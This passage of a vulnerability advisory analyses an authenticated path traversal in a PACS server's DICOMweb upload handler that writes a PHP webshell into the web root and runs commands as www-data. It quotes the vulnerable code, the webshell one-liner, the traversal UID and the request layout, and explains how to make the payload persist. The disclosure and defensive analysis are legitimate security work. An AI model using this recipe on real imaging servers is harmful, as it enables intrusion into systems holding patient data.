# PacsOne Server 7.3.9 — DICOMweb STOW-RS SOP Instance UID Path Traversal to Web-Root File Write and Code Execution as www-data (Authenticated)

Author: 0day Rubbish Research Team
Advisory: https://0day-rubbish.com/blog/rainbowfish-pacsone-stowrs-sop-instance-uid-traversal-rce
Repository: https://github.com/Exploit-Garbage/0day-Rubbish
Contact: disclosure@0day-rubbish.com

## 1. Overview

### Overview of the finding

PacsOne Server 7.3.9 is a closed-source commercial PACS (Picture Archiving and Communication
System) server from RainbowFish Software, California, United States. Its DICOMweb
STOW-RS handler, `stowrs.php`, accepts a `multipart/related; type=application/dicom` POST,
parses the DICOM Part 10 object contained in the request body, and stores it in the configured
archive directory. The storage filename is taken directly from the SOP Instance UID attribute,
DICOM tag `(0008,0018)`, which is read from the parsed object with
`$rawTags->getAttr(0x00080018)` and concatenated into the destination path without any
validation:

```php
function import($rawTags, $tempfile, $ipaddr) {
    $uid     = $rawTags->getAttr(0x00080018);
    $dir     = dirname($tempfile);
    $newfile = $dir . "/" . $uid;
    if (!rename($tempfile, $newfile)) {
        unlink($tempfile);
        return StowRsFailedReason::RefusedOutOfResources;
    }
    ...
}
```

That construction lives in `dicomweb.php`, in `import()` at approximately lines 1391-1440. A
SOP Instance UID is supposed to be a dotted string of digits — the DICOM Unique Identifier
format admits only the characters `0`-`9` and `.` — but the value returned by
`RawTags::getAttr()` is the raw attribute string exactly as it appeared on the wire. Nothing on
this path rejects `/`, rejects `..`, canonicalises the result, or confines it to the archive
root. The received object is therefore renamed to an attacker-chosen path: this is CWE-22
(path traversal) on a file-write sink, and it is reachable by any principal that holds the
product's `stowrs` privilege.

Because the rename destination is chosen by the attacker and the file content is the whole DICOM
object — whose 128-byte Part 10 preamble is not interpreted by the DICOM parser at all — the
traversal can place a file with a `.php` suffix inside the directory that Apache serves through
the product's `/pacsone` alias. Apache's PHP module then executes it. On our testbed the
preamble carried `<?php system($_GET["c"]); ?>`, the object was stored at
`/opt/pacsone/php/x.php`, and a subsequent GET to `/pacsone/x.php?c=id` returned:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The identity reached is the Apache worker user, uid 33. It is not root, and this advisory makes
no claim of privilege escalation beyond that identity, no claim of host escape, and no claim of
movement to any other machine.

The finding is authenticated. Reaching the sink requires a valid credential for an account that
holds the `stowrs` privilege, which on the tested installation is the administrator account
created by the vendor's own interactive installer. The value of the result is that the privilege
an account is meant to hold — "may store DICOM images" — is converted into "may execute
arbitrary code on the imaging server", which is a boundary the product's own privilege model
does not intend to cross. In a deployment that hands `stowrs` to an acquisition-side service
account (a modality, a scanner workstation, a vendor-neutral archive pushing studies), that
account becomes a code-execution foothold on the host where the patient image repository lives.

### Overview of the product and its runtime stack

PacsOne Server is sold as "PACS Server In One Box", Premium Edition. It is a two-part product:

- A native C++ DICOM/HL7 server process (delivered as `PacsOne.exe`, with `PacsOneSrv.exe` and
  `PacsOneHL7.exe` companions) that speaks the DICOM upper-layer protocol and HL7 on the ports
  chosen at install time.
- A PHP web application that implements the management console, the study browser, image
  conversion endpoints, and the DICOMweb services (`stowrs.php`, `wadors.php`, `qidors.php`)
  that this advisory concerns. The top level of the product's `php/` directory contains 204
  business endpoints.

Both parts sit on MySQL (the installer links a MariaDB client library) and Apache. The web entry
point is an Apache `Alias` mapping `/pacsone` to the product's `php/` directory, so every
endpoint is addressable as `https://host/pacsone/<endpoint>.php`. Persistence is split between
the MySQL schema (patient, study, series, image, privilege, usersignup and related tables) and
the filesystem archive directory, which holds the stored DICOM objects.

Installation on Linux is a two-stage process: `install.sh` performs dependency checks
(`libtool`, `libfreetype`), registers a `pacsone.service` systemd unit, links the bundled
libraries (CharLS, OpenSSL, MariaDB client, AWS SDK, ImageMagick), runs `ldconfig`, and finally
invokes the native `Setup.exe` installer. `Setup.exe` is an interactive program of roughly
eighteen prompts that chooses the AE title, the DICOM port, TLS settings, the database host,
port, database name, database user and password, the log directory, the archive directory, the
storage mode, HL7 enablement, and the application root password, then writes `PACSONE.ini` and
creates the database schema. On our instance the archive directory was set to
`/opt/pacsone/archive/` and the installation root to `/opt/pacsone`.

The stack we tested was Ubuntu 24.04 (x86-64), Apache 2.4.58 with `mod_php`, PHP 8.3, and MySQL
8.0. One deployment detail is worth recording because it shapes how the product expects its
database to be configured: the vendor's bundled MariaDB client library could not load the
`caching_sha2_password` authentication plugin that MySQL 8.0 enables by default, and the
installer's database step only succeeded after the server was configured with
`default_authentication_plugin=mysql_native_password`. That is a property of the vendor's
shipped client library, not of our testbed.

### Overview of the testbed and of what that implies

The target ran inside an Ubuntu 24.04 container built from the vendor's own Linux distribution
archive (`pacsone-7.3.9-Linux-x86_64.tar.gz`) using the vendor's `install.sh` and `Setup.exe`. The
`install.sh` flow we observed covers the dependency checks, the systemd unit, the bundled library
linking and the final `Setup.exe` invocation; Apache, PHP and the `/pacsone` alias were installed
and configured by us inside the container, matching the web entry point the product documents.
The container published the Apache port to the host, and all requests described in this advisory
were driven over HTTP from outside the container against that published port. The MySQL port was
not published. Everything in the DICOMweb chain — the authentication handshake, the
`multipart/related` POST, the JSON response, and the subsequent execution of the written file —
was exercised over HTTP end to end. The PHP source of the product is shipped in clear, so the
sink, the source, the privilege check and the store-directory construction were additionally
read from the shipped files, and the specific line numbers quoted in this advisory come from
that shipped source.

Three properties of our instance were established by us rather than by the vendor's defaults, and
a reader trying to reproduce this must know all three:

- The database name, database account and database password were chosen at install time by the
  `Setup.exe` prompts. The product ships no default web credentials and no default database
  credentials; the installer collects them. Our values are not published here and the PoC takes
  them as command-line arguments.
- The application root account and its password were likewise chosen by the `Setup.exe`
  "RootPW" prompt in our unattended installation. That account is the row that carries
  `stowrs=1` in the `privilege` table, so the credential that reaches the sink is an
  installer-issued administrator credential, not a factory constant.
- The two directories that make the chain work — the archive tree (the source of the temporary
  file) and the PHP tree (the traversal target) — must be writable by the web server identity.
  The vendor's `install.sh` establishes that ownership; during our manual container build the
  ownership had to be restored explicitly with `chown -R www-data:www-data` over the archive and
  `php` directories before `tempnam()`, `rename()` and `file_put_contents()` all succeeded. This
  matches the installer's own permission model rather than deviating from it, but it is a
  deliberate step and it is stated here as one.

Because both directories live under a single installation root (`/opt/pacsone/archive/` and
`/opt/pacsone/php/`) the traversal from the STOW-RS study directory up to the served PHP
directory is exactly three levels. That depth is a function of the configured archive path, not a
constant of the vulnerability: a deployment whose archive directory sits at a different depth
needs a different number of `../` components. The PoC exposes the depth as an argument and the
response is self-diagnosing, so the depth is cheap to determine (see section 8).

What the testbed does not tell us is also worth stating. The native DICOM server process did not
come up inside the container — `PacsOne.exe` and `PacsOneSrv.exe` were present but defunct, and
no listener existed on the DICOM ports — so the native DICOM upper-layer protocol was never
exercised and no statement in this advisory covers it. The web layer is what we assessed.

### Overview of affected scope

The affected component is the DICOMweb STOW-RS store path: `stowrs.php` as the authenticated
entry point, the `DicomWebStow` class in `dicomweb.php` as the multipart receiver, and
`import()` in `dicomweb.php` (approximately lines 1391-1440) as the vulnerable sink. The
underlying defect is a missing validator in `RawTags::getAttr()` (`dicom.php:4516`) and in the
Explicit VR parser `parseDataExplicit()` (`dicom.php:4378`), neither of which confines a `UI`
(Unique Identifier) value to the DICOM UID character set. Because the defect is in the store
path rather than in any one endpoint's authentication, we expect every build whose
`import()` derives the storage filename from `(0008,0018)` to behave the same way.

We tested PacsOne Server Premium Edition 7.3.9 on Linux x86-64 only. We did not test other 7.x
point releases, we did not test the Windows distribution (`Premium-7.3.9-x64.exe` was obtained
but not deployed), we did not test other editions, and we make no claim about them. On Windows
the same missing validation would apply to the PHP code, but the traversal target, the path
separator handling and the question of whether the PHP tree is served by the bundled web server
are all deployment-shaped details we did not verify, so we deliberately do not assert them.

### Overview of independence

This is original research on 7.3.9, not a re-published public issue. Eight prior public
advisories exist for this product family, and every one of them is against the 6.x release line;
at the time this research was performed the 7.x line had no published vulnerability records. The
prior 6.x work covers directory traversal in the download/image path, access-control defects in
the study-access endpoints, SQL injection in the signup username, cross-site scripting, and file
read/write issues — a different endpoint family from the DICOMweb store path, a different sink
function (`import()` in `dicomweb.php` rather than a download or query handler), and a different
root cause (a filename derived from a DICOM attribute rather than from an HTTP query parameter).
We also confirmed that the specific 6.x signup-username SQL injection pattern has been fixed in
7.3.9: `signupUser()` reaches the database through a prepared statement, and we found no
variant of it. Two historical traversal patterns were re-examined in 7.3.9 and did not survive as
arbitrary file access: `externalAccessStudy.php` interpolates an unfiltered `$studyUid` into a
path at line 30, but it interpolates it twice and appends a `.json` suffix, which reduces it to
information disclosure about the shared-studies directory; and `wadoAnonymized.php` does pass
attacker input to a file path, but that input goes through `isUidValid()`, whose character
whitelist blocks `/`. That second observation is the one that matters most for this advisory:
the product already contains a UID validator, and it is applied on one read path while the write
path that we abused does not call it.

## 2. Vulnerability Summary

### Vulnerability Summary table

| Field | Value |
|---|---|
| Product | PacsOne Server (PACS Server In One Box), Premium Edition |
| Vendor | RainbowFish Software (California, United States) |
| Version tested | 7.3.9, Linux x86-64 distribution |
| Vulnerable component | DICOMweb STOW-RS store path |
| Entry point | `POST /pacsone/stowrs.php?aetitle=<AE>` |
| Sink | `import()`, `dicomweb.php` approx. lines 1391-1440, `rename($tempfile, $dir . "/" . $uid)` |
| Tainted input | DICOM tag `(0008,0018)` SOP Instance UID, in the posted `application/dicom` part |
| Source accessor | `RawTags::getAttr()`, `dicom.php:4516` |
| Parser behaviour | `parseDataExplicit()`, `dicom.php:4378`, applies `trim()` only to a `UI` value |
| Missing control | `isUidValid()` exists in the codebase but is not called on this path |
| Weakness | CWE-22 path traversal on a file write; CWE-73; CWE-20 |
| Authentication | Required. Credential accepted as HTTP Basic, in the URL, or as a session id; then `hasaccess("stowrs", $username)` |
| Principal demonstrated | The installer-created administrator account (`privilege.stowrs=1`) |
| Achieved identity | `uid=33(www-data)`, no further escalation attempted |
| CVSS 3.1 | 7.2 High, `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Conditional reading | 8.8 High if a deployment grants `stowrs` to a non-administrator account (`PR:L`); not demonstrated |
| Default configuration | The permission model that makes the chain work is what the vendor installer establishes; the credentials are installer-collected, with no defaults shipped |
| Prior art | Eight prior advisories for this product, all against the 6.x line; none against 7.x |

### Vulnerability Summary mechanics

The mechanics are worth separating into five statements, because the fifth is the one that
decides whether a reproduction succeeds or silently fails.

1. `stowrs.php` authenticates the request, then hands the body to the `DicomWebStow` class.
   `DicomWebStow::__construct` (`dicomweb.php:1165`) reads the whole request body with
   `file_get_contents('php://input')`, splits the `multipart/related` parts on the boundary, and
   writes each DICOM part to a temporary file created with `tempnam($dir, "PacsOne")` followed by
   `file_put_contents($body)`, where `$dir` comes from `getStowRsStoreDir()`.
2. `getStowRsStoreDir()` (`database.php:1780`) returns the configured archive directory, plus
   `stowrs/`, plus a per-day subdirectory built from `date("Y-m-d-D")`. The temporary file
   therefore lives three directories below the installation root in a default Linux layout.
3. `store()` (`dicomweb.php:1592`) parses the temporary file into a `RawTags` object and checks
   that the SOP Class UID, the SOP Instance UID, the Study Instance UID and the Series Instance
   UID are non-empty. Those are presence checks, not format checks.
4. `import()` reads `(0008,0018)` back out of the parsed object with `getAttr()`, computes
   `$dir = dirname($tempfile)` and `$newfile = $dir . "/" . $uid`, and calls
   `rename($tempfile, $newfile)`. No validation happens between the read and the rename. The
   object's bytes — including the 128-byte preamble with our PHP tag in it — are now at the
   traversed path.
5. Only after the rename does `import()` insert database rows, into `image` first and then into
   `series`, `study` and `patient`. If any of those inserts fails, the failure branch calls
   `unlink($newfile)` and returns `ProcessingFailure`. So the traversal write already happened,
   and whether the written file survives depends on whether the inserts succeed.

Point 5 is the crux of both the technique and its reliability. An attacker who posts a minimal
DICOM object will very likely see the file appear and then disappear, and will conclude the
traversal does not work. It does work; the object was simply incomplete, the `patient` insert
failed, and the cleanup branch removed the payload. We hit exactly this on a first attempt: the
response was HTTP 409 carrying failure reason 272 (`ProcessingFailure`), the `image`, `series`
and `study` rows were present, the `patient` count was zero, and the written file had been
unlinked. Adding Patient Name `(0010,0010)`, Patient ID `(0010,0020)` and the pixel-attribute
set `(0028,xxxx)` made all four inserts succeed, the response became HTTP 200, and the file
persisted. The second route to persistence — aiming at a path where the subsequent `unlink()`
cannot remove the payload, or racing a concurrent request between the `rename()` and the
`unlink()` — was not tested and is not claimed here.

### Vulnerability Summary preconditions

Reaching code execution requires all of the following, and each one is a real gate rather than a
formality:

- A credential for an account that satisfies `hasaccess("stowrs", $username)`. On the tested
  installation that is the administrator account in the `administrator` group, whose `privilege`
  row carries `stowrs=1`; `isAdministrator()` short-circuits the check for that group. There are
  no default web credentials — the installer collects the application root password and creates
  the account.
- Working database connectivity. The privilege check is a database query, so the request must be
  served by an installation whose `Setup.exe`-configured database credentials are valid. If the
  application cannot authenticate to MySQL, the DICOMweb gate cannot pass either.
- Both endpoint-relevant directories writable by the web server user: the STOW-RS study directory
  under the archive root (for `tempnam()`) and the directory the traversal resolves into (for
  `rename()`). The vendor installer's ownership model provides this for its own `php/` and
  `archive/` trees.
- A traversal depth that matches the deployment's archive layout, and a payload suffix that the
  served PHP handler will execute. Both are attacker-visible: the STOW-RS response echoes the
  UID back, and a wrong depth produces a distinguishable failure.
- Knowledge that the payload path is free. `rename()` onto an existing file replaces it
  atomically, and the failure branch would then unlink the replaced file too — so choosing a
  filename that already exists in the served directory is destructive. Our exploit avoids this by
  probing the target URL first and refusing to proceed unless it returns 404, and by requiring
  the payload name to carry a `poc` marker string.

None of those preconditions is a default credential. Anyone assessing their own deployment should
read this as: an authenticated principal that is only supposed to store images can execute code on
the imaging host.

## 3. Authentication Boundary

### Authentication Boundary — how sessions are issued

The product has an interactive login flow for its management console. `login.php` renders a form
carrying the AE title and the database name; `authenticate.php` processes the submission, taking
the username from a POST field and decoding it with `urldecode()`. Two details of that handler
matter for the wider picture:

- It explicitly refuses traversal-looking usernames. The code checks
  `strstr($user, "..")` and `strstr($user, "/")` and rejects on either hit. The developers were
  therefore aware that an identity string can be used as a path component elsewhere in the
  product, and applied a filter on that one input.
- It implements lockout. Failed authentications are recorded under a `FailedLogin/` directory and
  are bounded by `MAX_LOGIN_ATTEMPTS` and `LOCKOUT_HOURS`, so online password guessing against the
  console is rate-limited.

Successful console authentication yields a PHP session, and the business endpoints that include
`security.php` require that session. A separate class of endpoints uses `MyConnection`, which
likewise binds to session state. That is the first gate in the product's model, and it is the
gate that covers most of the 204 endpoints.

Separately, `loginByAccessionNumber.php` is reachable without a session. It takes
`$hostname`, `$database`, `$username` and `$password` from `$_REQUEST` and constructs a
`MyDatabase` object with them, exchanging valid database credentials for an application session.
That is not a bypass in the ordinary sense — it requires credentials that work against the
installation's MySQL account — but it is worth naming because it means an attacker who obtains
database credentials by any route (from a configuration file readable by the web server identity,
for instance, which is exactly what this advisory's post-exploitation position would provide) can
convert them into a console session. We did not build such a chain, and nothing in the score below
assumes one.

### Authentication Boundary — what the gate actually checks

The DICOMweb endpoints (`stowrs.php`, `wadors.php`, `qidors.php`) do not rely on the console
session alone. They implement their own per-operation privilege gate, and `stowrs.php` does it in
its first sixty lines. Three credential transports are accepted, checked in this order: a
username and password supplied in the URL, HTTP Basic authentication, or a `sessionid` value that
is decrypted server-side. Whichever transport is used, the resulting username is passed to the
database and then to the privilege check.

The privilege check is `hasaccess()` in `database.php:315`. It is a prepared statement, so it is
not itself injectable:

```php
function hasaccess($access, $username) {
    if (isAdministrator($username)) {
        return true;
    }
    $stmt = $this->db->prepare("select $access from privilege where username=?");
    $stmt->bind_param("s", $username);
    ...
}
```

Two things follow. First, `isAdministrator($username)` is evaluated before the query and returns
true unconditionally for members of the administrator group, so that group holds every DICOMweb
privilege without a per-column grant. Second, for everyone else the answer comes from a single
column of the `privilege` table, selected by the operation name — for STOW-RS the column is
`stowrs`. This is a per-operation capability model, which is the right design: a store privilege
and a retrieve privilege are genuinely different things, and separating them is what allows a PACS
to expose study push to an acquisition device without exposing study query.

The `privilege` table on our installation had exactly one row:

| username | group | stowrs | qidors | wadors | forward |
|---|---|---|---|---|---|
| root | administrator | 1 | 1 | 1 | 0 |

The two database accounts created by `Setup.exe` (the application account and the signup account)
hold no `stowrs` privilege at all.

### Authentication Boundary — the principal required by the sink

The sink requires `privilege.stowrs=1` for the authenticating username, or membership in the
administrator group. On the installation we tested, that is one account: the administrator
account created by `Setup.exe`, whose password we chose during installation. The request that
reached the sink used HTTP Basic authentication with that account.

Two candidate downgrade routes were examined and both were closed:

- A bypass-file variable exists in the STOW-RS code path. When the referenced file is present, a
  fixed username and password (`wado` / `wado`) are accepted. The file does not exist on a
  default installation, we did not create it, and no authentication bypass exists on this path as
  shipped. The residual point for the vendor is that a hardcoded fallback credential gated on a
  filesystem condition is dead code that should not be in a shipped product: an operator who
  creates that file for any reason silently enables fixed credentials.
- Signup and access endpoints cannot mint the privilege. `userSignup.php` inserts a registration
  request into the `usersignup` table using a hardcoded database account (`constants.php:580-581`,
  the `usersignup` MySQL user with a password fixed in the shipped source); that MySQL account's
  grants on our installation were limited to `INSERT,UPDATE` on the `usersignup` table, with no
  `SELECT` on `privilege` or `study`. `loginByAccessionNumber.php` needs real database
  credentials. Neither route produces a `stowrs`-privileged principal, and we verified that
  neither the signup account nor the application account can pass `hasaccess("stowrs", ...)`.

So the honest statement is: the least privileged principal we demonstrated is an administrator.
Whether a *non*-administrator account can be granted `stowrs` — for example through an
administrative user-management screen provisioning a modality or a partner VNA — is a capability
the data model plainly supports (the privilege is a per-row column, not a group attribute) but
which our research did not establish as reachable through product UI or API. That is why the
headline rating carries `PR:H`, and why the `PR:L` reading is published separately as conditional.

### Authentication Boundary — what is deliberately not claimed

- No authentication bypass is claimed. The bypass-file path was inspected, its file is absent by
  default, and we did not create it.
- No unauthenticated reachability of `stowrs.php` is claimed. The 67 unauthenticated endpoints we
  surveyed did not include `stowrs.php`.
- No cross-account impact is claimed. Everything demonstrated happens in the context of the one
  account whose credential we supplied, and the resulting code execution runs as `www-data` on
  that one host.
- No credential-guessing claim is made. The console lockout described above was not attacked.
- The native DICOM protocol layer is out of scope. Its server processes were not running on our
  instance, so no statement here says anything about what a DICOM association on port 104 or
  11112 would permit.

## 4. Attack Surface

### Attack Surface — listeners, routes and their protection

The reachable surface of the installed product, as we mapped it, is:

| Listener / route | Protocol | Protection observed | Assessed |
|---|---|---|---|
| `/pacsone/*.php` (204 endpoints) | HTTP/HTTPS via Apache alias | Mixed: `security.php` session gate or `MyConnection` on most business endpoints; 67 endpoints reachable without a session; DICOMweb endpoints behind the `hasaccess` privilege gate | Yes, exhaustively on the unauthenticated subset |
| `stowrs.php` | HTTP, DICOMweb STOW-RS | `hasaccess("stowrs", $username)` | Yes, this advisory |
| `wadors.php`, `qidors.php` | HTTP, DICOMweb WADO-RS / QIDO-RS | `hasaccess("wadors"/"qidors", ...)`; `isUidValid()` on UID inputs | Yes, statically |
| DICOM upper layer (104/11112) | TCP, native C++ | No listener on our instance (processes defunct) | No |
| HL7 | TCP, native C++ | Not enabled on our instance | No |
| MySQL 3306 | TCP | Not published by our container; credentials set by `Setup.exe` | Integration layer only |
| Apache itself | HTTP | Standard server, not the product under assessment | Excluded |

The two-part architecture means the interesting privilege boundaries are internal to the PHP
application. There is no separate web server configuration hardening the DICOMweb endpoints; they
are ordinary `.php` files behind one Apache alias, sharing the same interpreter, the same
filesystem view and the same process identity as the management console.

### Attack Surface — how the surface was mapped

The PHP tree is shipped as source, so the mapping was direct. The 204 top-level business endpoints
were enumerated first, then classified by their protection: any file that included `security.php`,
used `MyConnection`, or resolved an authenticated user was treated as session-gated; everything
else was treated as an unauthenticated candidate and confirmed dynamically, because a static
"does it include the gate" judgement is not reliable on its own. That produced a set of 67
endpoints reachable without a session.

Those 67 endpoints were then worked through in four parallel deep-review passes split by function
area — DICOMweb endpoints, installation and administration endpoints, image-processing endpoints,
and utility/library endpoints — totalling 64 files reviewed for reachable sinks. For each one the
question was the same: is there a dangerous sink (command execution, file write, file inclusion,
deserialisation, SQL construction), is the sink's argument attacker-controlled, and can the
attacker control it without holding a credential or a database secret?

The result was negative, and the negative result is one of the more useful things in this
advisory: **no unauthenticated remote code execution sink was found in the web layer of
PacsOne Server 7.3.9.** The reason the surface is narrow is not that the endpoints are
authenticated but that their dangerous arguments are not attacker-controlled. The patterns we
found instead were:

- `download.php` passes an argument to `eval()`, but the value derives from a timestamp rather
  than from a request parameter.
- The `deencrypt` helper takes a key file path that is fixed in source.
- The `emailHtml` helper takes a file argument that is a fixed log path.
- `originalImage` copies a file whose source is derived from an internally computed `$path`.
- The upload-style endpoints derive their destination from `$_SESSION`, which an unauthenticated
  requester does not control.
- `dicomweb.php`'s own `file_put_contents()` call writes to a path produced by `tempnam()`, which
  is not attacker-controlled — the attacker-controlled part is the *rename destination* later, in
  `import()`, which is the finding in this advisory.
- Nine endpoints call procedural `imagick_*` functions that are not defined by the installed PECL
  extension build (which exposes the object-oriented API), making them dead code on PHP 8.3.
- Across the 204 endpoints we found no `unserialize()` sink at all, which closes the PHP
  deserialisation class for this build.

The unauthenticated findings that did survive review are reported in
section 10, and they are kept
separate from this finding and out of its score.

### Attack Surface — components that narrow the surface

Several product-internal controls are doing real work and deserve credit, because they explain why
the attack surface is as narrow as it is:

- `security.php` as a shared session gate over the core business endpoints.
- The per-operation `hasaccess()` privilege model for DICOMweb, backed by prepared statements.
- `authenticate.php`'s refusal of `..` and `/` in the submitted username, plus failed-login
  lockout.
- `isUidValid()` on UID-shaped inputs in the read paths — decisively, on `wadoAnonymized.php`,
  where it blocks traversal and confines an unauthenticated requester to shared studies whose
  identifiers it already knows.
- Extension restriction on `uploadImage.php`, which limits submissions to `.DCM` and therefore
  cannot be used to place an executable script (the endpoint also requires a session).
- `forward.php`, which includes both `security.php` and `MyConnection` and only writes a `dbjob`
  row, so it does not provide an unauthenticated request-forgery primitive.
- Prepared statements in `signupUser()`, which closed the historical signup-username injection.

The absence of any equivalent control on the *write* side of DICOMweb — where a UID becomes a
filename — is the gap this advisory documents. Reading and writing were hardened asymmetrically:
the read paths got a validator, the write path got a `trim()`.

## 5. Sink Identification

### Sink Identification — how the sink was found

The sink was found by sink-first search rather than by following a user-visible feature. Every
filesystem-mutating primitive in the PHP tree was enumerated — `file_put_contents`, `fwrite`,
`fopen` in write mode, `copy`, `move_uploaded_file`, `rename`, `unlink`, `mkdir`, `rmdir` — and
each hit was walked backwards to ask whether any component of the destination path traced to
request data. Most did not: destinations derived from `tempnam()`, from `$_SESSION`, from fixed
constants, or from server-side timestamps were set aside as uncontrolled.

`import()` in `dicomweb.php` stood out because its destination is *string concatenation of a
parsed protocol field*. Once that was visible, the question became whether the field is
constrained anywhere between the network and the `rename()`. It is not, and the DICOMweb STOW-RS
handler is designed to be called by machines (modalities, worklists, partner PACS), which is
precisely the kind of interface where a protocol field is trusted to be well-formed because the
peer is expected to be a conforming implementation. That trust is the vulnerability.

### Sink Identification — the vulnerable construction

The relevant body of `import()` (`dicomweb.php`, approximately lines 1391-1440), reduced to the
lines that matter and with the column list abbreviated as it appears in the shipped source:

```php
function import($rawTags, $tempfile, $ipaddr) {
    $uid     = $rawTags->getAttr(0x00080018);   /* SOP Instance UID, attacker supplied */
    $dir     = dirname($tempfile);              /* <archivedir>/stowrs/<day-dir>        */
    $newfile = $dir . "/" . $uid;               /* no validation, no canonicalisation   */
    if (!rename($tempfile, $newfile)) {         /* traversal write happens HERE         */
        unlink($tempfile);
        return StowRsFailedReason::RefusedOutOfResources;
    }
    $columns = array(
        "path" => array(true, $newfile),        /* traversed path is persisted          */
        "uuid" => array(true, $uid),
        /* ... further image columns ... */
    );
    $ok = $this->insertTable("image", $columns);
    if (!$ok) {
        unlink($newfile);                       /* failure branch removes the payload   */
        return StowRsFailedReason::ProcessingFailure;
    }
    /* series, study and patient inserts follow; each failure path also unlinks */
}
```

Three properties of this construction are security-relevant and none of them is incidental:

- **The write precedes the record.** `rename()` executes before `insertTable("image", ...)`. At
  the moment of the rename the product has not decided whether it will keep the object, but the
  filesystem has already been changed. Any control that lives in the database layer — a schema
  constraint, a length limit, a uniqueness check — is downstream of the damage.
- **The traversed path is persisted verbatim.** On the successful run, the `image` row contained
  `uuid = ../../../php/x.php` and
  `path = /opt/pacsone/archive/stowrs/<day-dir>/../../../php/x.php`. The database therefore holds
  the traversal string rather than a canonicalised location. That is a detection opportunity, discussed in
  section 10, and it is also why later retrieval of that
  instance produces a retrieval URL containing percent-encoded traversal.
- **The failure branch deletes a path it never validated.** `unlink($newfile)` is called on
  whatever `$newfile` resolves to. Combined with `rename()`'s atomic replace semantics, a
  deliberate failure could therefore be used to destroy an existing file that the web server user
  can write: the rename replaces it with DICOM bytes and the unlink removes it entirely. We did
  not exercise this, we are not publishing a procedure for it, and our PoC refuses to target any
  path that already resolves. It is stated because it changes the integrity and availability
  argument: the primitive is not only "write an attacker-chosen file", it is also "replace and
  then delete a file whose name the attacker chooses inside any directory the web server user can
  write".

### Sink Identification — execution identity of the child process

There is no child process in this chain. The execution identity is the Apache worker that serves
the request, running PHP through `mod_php`, which is `www-data` on this platform. Two independent
observations confirm it:

- The written file is owned by the web server identity and is mode `0600`:
  `-rw------- 1 www-data www-data 580 <timestamp> /opt/pacsone/php/x.php`. The `0600` mode is the
  mode `tempnam()` creates files with; it survived the rename. It does not obstruct execution,
  because the interpreter reading the file runs as the same uid that owns it. That detail matters
  for anyone reasoning about whether restrictive permissions would have blocked this: they do
  not, when the writer, the owner and the reader are the same identity.
- The command output over HTTP is `uid=33(www-data) gid=33(www-data) groups=33(www-data)`, and
  `whoami` returns `www-data`.

So the PHP code runs inside the web server process with the web server's filesystem access. It
does not spawn a separate daemon, does not change identity, and has no more privilege than the
Apache worker — which on a PACS host is the identity that owns the study repository.

### Sink Identification — sibling sinks, and whether they are proven

Other filesystem sinks exist in the same product. Their status, stated with the honesty each one
deserves:

| Sink | Location | Status |
|---|---|---|
| `rename()` on a UID-derived path | `dicomweb.php` `import()` L1391-1440 | **Proven**, exercised end to end |
| `file_put_contents()` on a `tempnam()` path | `dicomweb.php` `DicomWebStow::__construct` L1165 | Not attacker-controlled; path comes from `tempnam()` |
| `eval()` on a timestamp-derived value | `download.php` | Not attacker-controlled; reviewed and excluded |
| Upload destination from `$_SESSION` | upload-style endpoints | Requires a session; not attacker-controlled unauthenticated |
| `.DCM` extension restriction | `uploadImage.php` | Blocks script placement; requires a session |
| `file_get_contents()` on a `$studyUid`-derived path | `externalAccessStudy.php:30` | **Proven as information disclosure only.** `$studyUid` is unfiltered, but it is interpolated twice and a `.json` suffix is appended, and an `aetitle` that does not resolve yields an empty directory component. Result: the endpoint discloses the shared-studies directory location; it does not provide arbitrary file read |
| `file_get_contents()` on UID-derived paths | `wadoAnonymized.php` | Traversal blocked by `isUidValid()`; confined to `SharedStudies/` |
| Native DICOM C-STORE file handling | `PacsOne.exe` | **Not assessed**; the process did not run on our instance |

Only the first row is the subject of this advisory. The `externalAccessStudy.php` row is included
because it is the closest structural relative in the product — an unfiltered identifier reaching a
path construction — and because its outcome shows the difference an extra constraint makes: two
interpolations and a suffix turned an arbitrary-read candidate into a disclosure, whereas
`import()`'s single interpolation with a free suffix turned a UID into a filename.

## 6. Source Identification

### Source Identification — the tainted input and its transport

The tainted value is DICOM tag `(0008,0018)`, SOP Instance UID, expressed in code as the integer
key `0x00080018`. Its transport is the body of an authenticated HTTP POST:

```
POST /pacsone/stowrs.php?aetitle=PACSONE HTTP/1.1
Host: 127.0.0.1
Authorization: Basic <base64 of username:password>
Content-Type: multipart/related; type=application/dicom; boundary=PACSBOUND
Accept: application/dicom+json
Content-Length: <n>

--PACSBOUND
Content-Type: application/dicom

<128-byte preamble><"DICM"><file meta group 0002><dataset groups 0008 .. 0028>
--PACSBOUND--
```

Inside the DICOM part, the attribute appears as an Explicit VR Little Endian element: group
`0x0008`, element `0x0018`, VR `UI`, a 16-bit length, then the value bytes. In our object the
value bytes were `../../../php/x.php` padded with a trailing NUL to an even length, as the `UI` VR
requires. The transfer syntax declared in the file meta header (`(0002,0010)`) was
`1.2.840.10008.1.2.1`, Explicit VR Little Endian, which is what selects the `parseDataExplicit()`
code path.

The transport matters for one structural reason: the value arrives as a length-prefixed binary
field inside a protocol object, not as an HTTP query parameter or form field. It is therefore
invisible to any request-level filtering the product might apply to URL arguments, it is not
percent-decoded, and it does not appear in a web application firewall's view of the request as a
parameter — it is opaque binary payload. The only thing that inspects it is the product's own
DICOM parser.

Two related observations from the same object: the file meta header's Media Storage SOP Instance
UID `(0002,0003)` was set to an ordinary dotted UID while the dataset's `(0008,0018)` carried the
traversal, and the server used the dataset value (the persisted `image.uuid` is the traversing
string). A validator bolted onto the meta-header parse alone would not have caught this.
Separately, the attributes in group `(0028,xxxx)` were emitted in the order `0002, 0004, 0010,
0011, 1000, 1001, 0103`, which is not ascending and therefore not conformant to the DICOM
encoding rules; the parser accepted it. The parser is structurally lenient, so leniency cannot be
relied upon to reject malformed identifiers either. Any validator has to be explicit.

### Source Identification — sanitization that exists, and what it is for

The value passes through exactly one transformation between the wire and the `rename()`. In
`parseDataExplicit()` (`dicom.php:4378`):

```php
$value = isset($array['value']) ? trim($array['value']) : "";
$this->attrs[$key] = array("vr" => $vr, "value" => $value);
```

`trim()` removes leading and trailing whitespace. That is its purpose: DICOM text VRs are padded
to even length with spaces (`CS`, `LO`, `SH`, `PN` and friends), and `UI` values are padded with
NUL, so a parser that wants a clean scalar trims the padding. It is a formatting normalisation,
not a security control. It removes nothing from the middle of the string, and `/`, `.` and `..`
are untouched.

Retrieval is equally direct. `RawTags::getAttr()` (`dicom.php:4516`):

```php
function getAttr($key) {
    $value = false;
